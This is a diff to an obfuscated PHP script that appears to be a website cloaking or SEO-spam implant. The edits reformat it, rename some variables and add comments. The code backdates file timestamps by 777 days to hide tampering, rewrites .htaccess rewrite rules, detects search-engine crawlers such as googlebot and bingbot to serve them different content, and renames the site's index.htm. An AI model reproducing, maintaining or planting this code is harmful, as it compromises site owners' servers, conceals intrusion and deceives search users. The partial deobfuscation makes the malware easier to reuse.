@@ -165,9 +165,11 @@ function l1AeQJ($fname,$content='',$mode='w'){
     }
 }
 
+/*
 function l13C3($l1ihTM1){
     return preg_split("//u",$l1ihTM1,-1,PREG_SPLIT_NO_EMPTY);
 }
+*/
 
 function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
 
@@ -301,9 +303,10 @@ function l1J($l1A='',$l1Ckl=false,$l1dQ=1,$l1dah=''){
     }
 }
 
-function l1uKK($l1Q5J){
-    if(file_exists($l1Q5J)){
-        @touch($l1Q5J,strtotime("-777 days"));
+/* Change file timestamp */
+function l1uKK($file){
+    if(file_exists($file)){
+        @touch($file,strtotime("-777 days"));
     }
 }
 
@@ -330,6 +333,7 @@ function l1SU($l1jePKwT=''){
     }
 }
 
+/* Write htaccess*/
 function l1Rm($l1XNaVU=''){
     $l1XNaVU = ".htaccess";
     if(!l1TMU($l1XNaVU)){
@@ -340,7 +344,7 @@ function l1Rm($l1XNaVU=''){
             preg_match_all("/<IfModule\s+mod_rewrite.c>[^<]+<\/IfModule>/si",$l1eb,$l1Ll);
             if(isset($l1Ll[0])&&!empty($l1Ll[0])){
                 foreach($l1Ll[0]as$l1Hj2){
-                    if(!preg_match("/(\{HT"."TP_USER_AGENT\}|webdirect.php|\/index.php|php\?hl"."=\\\$1|\^\(.\*\)\\\$|.\*-.\*|\?\\\$\d\d?\\\$1\d)/si",$l1Hj2)){
+                    if(!preg_match("/(\{HTTP_USER_AGENT\}|webdirect.php|\/index.php|php\?hl=\\\$1|\^\(.\*\)\\\$|.\*-.\*|\?\\\$\d\d?\\\$1\d)/si",$l1Hj2)){
                         $l1k[]=$l1Hj2;
                     }
                 }
@@ -358,7 +362,9 @@ function l1Rm($l1XNaVU=''){
 
 function l1Rc6HvA($l1ucnnn,$l13aW=1){
     $l1lEpe = '\\?/|&()[]{}+^$!:*';
-    $l1rPS2cy = l13C3($l1lEpe);
+    //$l1rPS2cy = l13C3($l1lEpe);
+    $l1rPS2cy = preg_split("//u",$l1lEpe,-1,PREG_SPLIT_NO_EMPTY);
+
     $l17Ek = "%s%s";
     if($l13aW){
         $l1ucnnn = preg_replace("/(\?|#).*/si",'',$l1ucnnn);
@@ -507,9 +513,11 @@ foreach($l1SHW as $l1jccWg){
 
 $l1VaP419=array("googlebot","bingbot","slurp","msnbot","jeeves","teoma","crawler","spider");
 foreach($l1VaP419 as$l1a){
-if(strpos($l16I,$l1a)!==false){
-return l1n($l13P,$l16I);
-}}return false;
+    if(strpos($l16I,$l1a)!==false){
+        return l1n($l13P,$l16I);
+    }
+}
+return false;
 }
 
 function l1n($l12,$l1uiO){
@@ -555,55 +563,60 @@ function l15w($l1WoAo5U,$l1OZb,$l1S=array()){
     return$l1Lp;
 }
 
-function l1kw6($l1L='',$l1FGxQ=0){
-    if($l1FGxQ){
-        $l1L=preg_replace("/&amp;/s",'&',$l1L);
-        $l1L=preg_replace("/&apos;/s","'",$l1L);
-        $l1L=preg_replace("/&quot;/s",'"',$l1L);
-        $l1L=preg_replace("/&gt;/s",'>',$l1L);
-        $l1L=preg_replace("/&lt;/s",'<',$l1L);
+/* Convert html entities and vice-versa */
+function l1kw6($string='',$mode=0){
+    if($mode){
+        $string = preg_replace("/&amp;/s",'&',$string);
+        $string = preg_replace("/&apos;/s","'",$string);
+        $string = preg_replace("/&quot;/s",'"',$string);
+        $string = preg_replace("/&gt;/s",'>',$string);
+        $string = preg_replace("/&lt;/s",'<',$string);
     }else{
-        $l1L=preg_replace("/&/s","&amp;",$l1L);
-        $l1L=preg_replace("/'/s","&apos;",$l1L);
-        $l1L=preg_replace('/"/s',"&quot;",$l1L);
-        $l1L=preg_replace("/>/s","&gt;",$l1L);
-        $l1L=preg_replace("/</s","&lt;",$l1L);
+        $string = preg_replace("/&/s","&amp;",$string);
+        $string = preg_replace("/'/s","&apos;",$string);
+        $string = preg_replace('/"/s',"&quot;",$string);
+        $string = preg_replace("/>/s","&gt;",$string);
+        $string = preg_replace("/</s","&lt;",$string);
     }
-    return  $l1L;
+    return  $string;
 }
 
 function l1RnVra($l1P=0,$l1X='3~5',$l108=-1){
-$l16=range('a','z');
-$l1xi=range('A','Z');
-$l1l=range(0,9);
-switch($l1P){
-case 0:$l1i052=$l16;
-break;
-case 1:$l1i052=$l1l;
-break;
-case 2:$l1i052=array_merge($l16,$l1l);
-break;
-case 3:$l1i052=array_merge($l16,$l1xi);
-break;
-case 4:$l1i052=$l1xi;
-break;
-case 5:$l1i052=array_merge($l16,$l1xi,$l1l);
-break;
-}
-$l1Si=explode('~',$l1X);
-if(count($l1Si)==1){
-$l1X=(int)$l1X;
-}else{
-$l1X=mt_rand((int)$l1Si[0],(int)$l1Si[1]);
-}
-$l1K9o0F1='';
-shuffle($l1i052);
-$l1K9o0F1=substr(implode('',$l1i052),0,$l1X);
-return$l1K9o0F1;
+    $l16=range('a','z');
+    $l1xi=range('A','Z');
+    $l1l=range(0,9);
+
+    switch($l1P){
+        case 0:$l1i052=$l16;
+            break;
+        case 1:$l1i052=$l1l;
+            break;
+        case 2:$l1i052=array_merge($l16,$l1l);
+            break;
+        case 3:$l1i052=array_merge($l16,$l1xi);
+            break;
+        case 4:$l1i052=$l1xi;
+            break;
+        case 5:$l1i052=array_merge($l16,$l1xi,$l1l);
+            break;
+    }
+
+    $l1Si=explode('~',$l1X);
+
+    if(count($l1Si)==1){
+        $l1X=(int)$l1X;
+    }else{
+        $l1X=mt_rand((int)$l1Si[0],(int)$l1Si[1]);
+    }
+
+    $l1K9o0F1 = '';
+    shuffle($l1i052);
+    $l1K9o0F1 = substr(implode('',$l1i052),0,$l1X);
+    return $l1K9o0F1;
 }
 
 function l19($l1SDKs){
-    global$l1Ni6,$l1go;
+    global $l1Ni6,$l1go;
     $l1Nt=str_replace("$l1SDKs/",'',$l1Ni6);
     $l1BRS=array();
     $l1O=l1BSTEtn(l1O2($l1SDKs));
@@ -709,7 +722,7 @@ function l1P9LVD($l15tGX=''){
 
     l1Rm();
 
-    global$l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k,$l1VQ,$l11ufJ,$l1h,$l1EbALe;
+    global $l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k,$l1VQ,$l11ufJ,$l1h,$l1EbALe;
 
     l1K5dsu($l1I);
 
@@ -753,45 +766,47 @@ function l1P9LVD($l15tGX=''){
     }
 
     $l1gfDiJL = explode('|',$l1h[0]);
-    $l1T2=isset($l1h[1])?explode(',',$l1h[1]):array();
-    $l13dbLD=$l1Qhzk2;
-    $l19=$l1go;
-    $l1c=$l1EbALe;
-    $l11ufJ=preg_split('//',$l11ufJ,-1,PREG_SPLIT_NO_EMPTY);
-    $l1EbALe=preg_split('//',$l1EbALe,-1,PREG_SPLIT_NO_EMPTY);
-    $l11ufJ=count($l11ufJ)!=4?array(1,1,1,0):$l11ufJ;
-    $l1EbALe=count($l1EbALe)!=9?array(1,0,1,1,0,1,0,0,0):$l1EbALe;
-    $l1f1oojq=sprintf("http%s://$l13K",l1UT7($l1EbALe[8]));
-    $l1qv=str_replace("www.",'',$l13K);
+    $l1T2 = isset($l1h[1])?explode(',',$l1h[1]):array();
+    $l13dbLD = $l1Qhzk2;
+    $l19 = $l1go;
+    $l1c = $l1EbALe;
+    $l11ufJ = preg_split('//',$l11ufJ,-1,PREG_SPLIT_NO_EMPTY);
+    $l1EbALe = preg_split('//',$l1EbALe,-1,PREG_SPLIT_NO_EMPTY);
+    $l11ufJ = count($l11ufJ)!=4?array(1,1,1,0):$l11ufJ;
+    $l1EbALe = count($l1EbALe)!=9?array(1,0,1,1,0,1,0,0,0):$l1EbALe;
+    $l1f1oojq = sprintf("http%s://$l13K",l1UT7($l1EbALe[8]));
+    $l1qv = str_replace("www.",'',$l13K);
+
     $l1ekHESi=$l1c9=isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:'');
     $l1ekHESi=$l1c9=($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);
     $l1i=$l1f1oojq.$l1ekHESi;
     $l1bS3es='';
     $l1ko='';
     $l17dhJj="index.htm";
+
     if(file_exists($l17dhJj)){
-    @rename($l17dhJj,"{
-    $l17dhJj}000");
-    }if(file_exists("{
-    $l17dhJj}l")){
-    @rename("{
-    $l17dhJj}l","{
-    $l17dhJj}l000");
-    }if(file_exists("{
-    $l17dhJj}000")){
-    $l1ko="{
-    $l17dhJj}000";
-    }if(file_exists("{
-    $l17dhJj}l000")){
-    $l1ko="{
-    $l17dhJj}l000";
+        @rename($l17dhJj,"{$l17dhJj}000");
     }
-    $l1M=isset($_SERVER["SCRIPT_NAME"])?$_SERVER["SCRIPT_NAME"]:'';
-    if($l1M==''){
-    $l1M=isset($_SERVER["SCRIPT_FILENAME"])?$_SERVER["SCRIPT_FILENAME"]:'';
-    if($l1M!=''){
-    $l1M=str_replace($l1I,'',$l1M);
-    }}
+
+    if(file_exists("{$l17dhJj}l")){
+        @rename("{$l17dhJj}l","{$l17dhJj}l000");
+    }
+
+    if(file_exists("{$l17dhJj}000")){
+        $l1ko="{$l17dhJj}000";
+    }
+    if(file_exists("{$l17dhJj}l000")){
+        $l1ko="{$l17dhJj}l000";
+    }
+
+    $l1M = isset($_SERVER["SCRIPT_NAME"])?$_SERVER["SCRIPT_NAME"]:'';
+    if($l1M == ''){
+        $l1M = isset($_SERVER["SCRIPT_FILENAME"])?$_SERVER["SCRIPT_FILENAME"]:'';
+        if($l1M!=''){
+            $l1M = str_replace($l1I,'',$l1M);
+        }
+    }
+
     l1SU("$l1I$l1M,".__FILE__);
 
     if($l1M!=''){
@@ -800,6 +815,7 @@ function l1P9LVD($l15tGX=''){
         $l1bS3es=$l1fPNZ!==false?substr($l1M,0,$l1fPNZ):'';
         $l1o7fR=$l1fPNZ!==false?substr($l1M,$l1fPNZ+1):$l1M;
     }
+
     $l1GpDpli=!l1TMU(__FILE__);
     $l1Z4k=preg_match('/!$/',$l1GRfrF8)?1:0;
     $l1GRfrF8=preg_replace('/!/','',$l1GRfrF8);
@@ -809,16 +825,22 @@ function l1P9LVD($l15tGX=''){
     $l1uH=false;
     $l1RB6TU=$l1xj0grt."|ls1|ls2";
     $l1RB6TU=explode('|',$l1RB6TU);
+
     foreach($l1RB6TU as$l14eeRaA){
-    $l1c9=preg_replace("/(\?|&)".$l14eeRaA."/si",'',$l1c9);
+        $l1c9 = preg_replace("/(\?|&)".$l14eeRaA."/si",'',$l1c9);
     }
+
     $l1c9=preg_replace("/^\//si",'',$l1c9);
     $l1c9=$l1bS3es!=''?preg_replace(sprintf("/^%s\//si",l1Rc6HvA($l1bS3es)),'',$l1c9):$l1c9;
+
     if(!preg_match("/^\?/si",$l1c9)){
-    $l1c9=preg_replace("/^($l1o7fR)?(\?|\/)/si",'',$l1c9);
-    }if(preg_match('/.(gif|jpe?g|ico|png|bmp|css|js)$/si',$l1c9)){
-    exit();
+        $l1c9=preg_replace("/^($l1o7fR)?(\?|\/)/si",'',$l1c9);
     }
+
+    if(preg_match('/.(gif|jpe?g|ico|png|bmp|css|js)$/si',$l1c9)){
+        exit();
+    }
+
     $l1iQ=$l1GRfrF8;
     $l1iQ=preg_replace("/^\//si",'',$l1iQ);
     $l1Q8lar=l1Rc6HvA($l1c9);
@@ -837,48 +859,59 @@ function l1P9LVD($l15tGX=''){
     $l1uVp=1;
     $l13GLz=1;
     $l1pods5=0;
+
     if(preg_match('/\.xml$/si',$l1c9)){
-    $l1c9=preg_replace("/^\?/si",'',$l1c9);
-    $l1FP8t=true;
-    $l1rWwO5=explode('/',$l1c9);
-    $l1tZfKz=array_pop($l1rWwO5);
-    if(preg_match("/([^\d]+)(\d+)\.xml$/si",$l1tZfKz,$l1lDPmlX)){
-    $l177Y=$l1lDPmlX[1];
-    $l1jYBBQn=$l1lDPmlX[2];
-    }else{
-    $l177Y=preg_replace("/([a-z]+_?).*/si","$1",$l1tZfKz);
-    }if(!empty($l1rWwO5)&&preg_match('/^([a-z])?(\d+)$/si',$l1rWwO5[count($l1rWwO5)-1],$l1b)){
-    if(count($l1b)==3){
-    $l1qsb509=$l1b[2];
-    if($l1b[1]=='s'){
-    $l1VqK=1;
-    }elseif($l1b[1]=='g'){
-    $l1VqK=2;
-    }}else{
-    $l1qsb509=$l1qsb509[0];
+        $l1c9=preg_replace("/^\?/si",'',$l1c9);
+        $l1FP8t=true;
+        $l1rWwO5=explode('/',$l1c9);
+        $l1tZfKz=array_pop($l1rWwO5);
+        if(preg_match("/([^\d]+)(\d+)\.xml$/si",$l1tZfKz,$l1lDPmlX)){
+            $l177Y=$l1lDPmlX[1];
+            $l1jYBBQn=$l1lDPmlX[2];
+        }else{
+            $l177Y=preg_replace("/([a-z]+_?).*/si","$1",$l1tZfKz);
+        }
+        
+        if(!empty($l1rWwO5)&&preg_match('/^([a-z])?(\d+)$/si',$l1rWwO5[count($l1rWwO5)-1],$l1b)){
+            if(count($l1b)==3){
+                $l1qsb509=$l1b[2];
+                if($l1b[1]=='s'){
+                    $l1VqK=1;
+                }elseif($l1b[1]=='g'){
+                    $l1VqK=2;
+                }
+            }else{
+                $l1qsb509=$l1qsb509[0];
+            }
+            array_pop($l1rWwO5);
+        }
+        if(!empty($l1rWwO5)&&is_numeric($l1rWwO5[count($l1rWwO5)-1])){
+            $l1r=array_pop($l1rWwO5);
+            $l1Zf0=true;
+        }
+        if(!empty($l1rWwO5)){
+            $l1yBQ=implode('/',$l1rWwO5);
+        }
+        $l1XwKTlO=$l1jYBBQn==1?1:(($l1r+1)*($l1jYBBQn-1)*$l1qsb509);
+        $l1XwKTlO=$l1XwKTlO<0?0:$l1XwKTlO;
     }
-    array_pop($l1rWwO5);
-    }if(!empty($l1rWwO5)&&is_numeric($l1rWwO5[count($l1rWwO5)-1])){
-    $l1r=array_pop($l1rWwO5);
-    $l1Zf0=true;
-    }if(!empty($l1rWwO5)){
-    $l1yBQ=implode('/',$l1rWwO5);
+
+    if(preg_match('/^listing((?:1|\w)+)?\/(\d+)\/(?:(\d+)\/)?\w+\.html$/si',preg_replace("/^\?/si",'',$l1c9),$l124kWx)){
+        if($l124kWx[1]==1){
+            $l1pods5=1;
+        }
+        $l1uVp=(int)$l124kWx[2];
+        $l1VC2k=1;
+        if(isset($l124kWx[3])){
+            $l13GLz=(int)$l124kWx[3];
+        }
     }
-    $l1XwKTlO=$l1jYBBQn==1?1:(($l1r+1)*($l1jYBBQn-1)*$l1qsb509);
-    $l1XwKTlO=$l1XwKTlO<0?0:$l1XwKTlO;
-    }if(preg_match('/^listing((?:1|\w)+)?\/(\d+)\/(?:(\d+)\/)?\w+\.html$/si',preg_replace("/^\?/si",'',$l1c9),$l124kWx)){
-    if($l124kWx[1]==1){
-    $l1pods5=1;
-    }
-    $l1uVp=(int)$l124kWx[2];
-    $l1VC2k=1;
-    if(isset($l124kWx[3])){
-    $l13GLz=(int)$l124kWx[3];
-    }}
+
     $l1Ni6="$l1f1oojq/$l1bS3es".($l1bS3es==''?'':'/');
     $l1Z4k=$l1Z4k?"/$l1bS3es".($l1bS3es==''?'':'/'):$l1Ni6;
     $l1v=$l1go;
     $l1ST2=false;
+
     define("TEST_MODE",isset($_GET["list_test"])?true:false);
 
     foreach($l1YlvID as$l1W){
@@ -888,11 +921,13 @@ function l1P9LVD($l15tGX=''){
         }
     }
 
-    $l1z=true;
+    $l1z = true;
     foreach($l1YlvID as$l14){
-    if(isset($_GET[$l14])){
-    unset($_GET[$l14]);
-    }}
+        if(isset($_GET[$l14])){
+            unset($_GET[$l14]);
+        }
+    }
+
     $l1pOeVk=isset($_SERVER["HTTP_REFERER"])?$_SERVER["HTTP_REFERER"]:'';
     $l13c=isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:'';
     $l13=l1AZ($l13c,$l1ST2);
@@ -1180,8 +1215,9 @@ function l1P9LVD($l15tGX=''){
     exit();
     }if($l1WyZOKd){
     if($l1ko!=''){
-    echo file_get_contents($l1ko);
-    }return;
+        echo file_get_contents($l1ko);
+    }
+    return;
     }
     $l1Kr=l1O2($l11ia);
     $l1Kr=trim($l1Kr);
@@ -1225,11 +1261,3 @@ function l1P9LVD($l15tGX=''){
 }
 
 l1P9LVD();
-//echo "\n";
-// End
-//echo "/<head.*%s>/si"; // /<head.*%s>/si
-//echo "curl_init"; // curl_init
-//echo "curl_exec";
-#echo "pfsockopen"; //pfsockopen
-#echo pfsockopen;
-
